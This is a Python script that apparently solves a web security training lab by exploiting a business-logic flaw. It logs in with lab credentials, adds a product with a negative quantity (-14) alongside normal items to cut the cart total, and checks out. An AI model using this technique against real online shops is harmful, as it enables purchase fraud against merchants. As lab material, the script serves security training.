import requests
import json
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# This method fetches the csrf token from url and returns csrf token
def get_csrf_token(session, url):
    r = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find("input", {'name': 'csrf'})
    if csrf_input:
        csrf = csrf_input['value']
    else:
        raise ValueError("CSRF token not found")
    return csrf

# Retrieve csrf token from get_csrf_token method for every post request
def buy_item(session, main_url):
    login_url = main_url + "/login"
    csrf_token = get_csrf_token(session, login_url)

    # Login as the user
    print("(+) Logging in as the user...")
    data_login = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
    r = session.post(login_url, data=data_login, verify=False, proxies=proxies)
    
    if "Log out" in r.text:
        print("(+) Successfully logged in as the user.")

        # Add item to cart
        cart_url = main_url + "/cart"
        data_cart = {"productId": "1", "redir": "PRODUCT", "quantity": "1"}
        # Send POST request
        r = session.post(cart_url, data=data_cart, verify=False, proxies=proxies)
        print(f"(+) Add to cart response code: {r.status_code}")
        print(r.text)
        if r.status_code != 200:
            print("(-) Failed to add items to cart.")
            sys.exit(-1)
            
        # Add -ve item to cart
        cart_url = main_url + "/cart"
        data_cart = {"productId": "2", "redir": "PRODUCT", "quantity": "-14"}
        # Send POST request
        r = session.post(cart_url, data=data_cart, verify=False, proxies=proxies)
        print(f"(+) Add to cart response code: {r.status_code}")
        print(r.text)
        if r.status_code != 200:
            print("(-) Failed to add items to cart.")
            sys.exit(-1)
        # Add another item to cart
        cart_url = main_url + "/cart"
        data_cart = {"productId": "3", "redir": "PRODUCT", "quantity": "1"}
        # Send POST request
        r = session.post(cart_url, data=data_cart, verify=False, proxies=proxies)
        print(f"(+) Add to cart response code: {r.status_code}")
        print(r.text)
        if r.status_code != 200:
            print("(-) Failed to add items to cart.")
            sys.exit(-1)
        
        # Checkout
        checkout_url = main_url + "/cart/checkout"
        checkout_csrf_token = get_csrf_token(session, cart_url)
        data_checkout = {"csrf": checkout_csrf_token}
        r = session.post(checkout_url, data=data_checkout, verify=False, proxies=proxies)
        print(f"(+) Checkout response code: {r.status_code}") 
        print(r.text)
        
        # Check if we solved the lab
        if "Congratulations" in r.text:
            print("(+) Successfully exploited the business logic vulnerability.")
        else:
            print("(-) Could not exploit the business logic vulnerability.")
            sys.exit(-1)
    else:
        print("(-) Could not login as user.")

def main():    
    if len(sys.argv) != 2:
        print("Warning!\nNot enough arguments! Please provide by following below usage command and Example")
        print("(+) Usage command: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    session = requests.Session()
    main_url = sys.argv[1]
    buy_item(session, main_url)

if __name__ == "__main__":
    main()
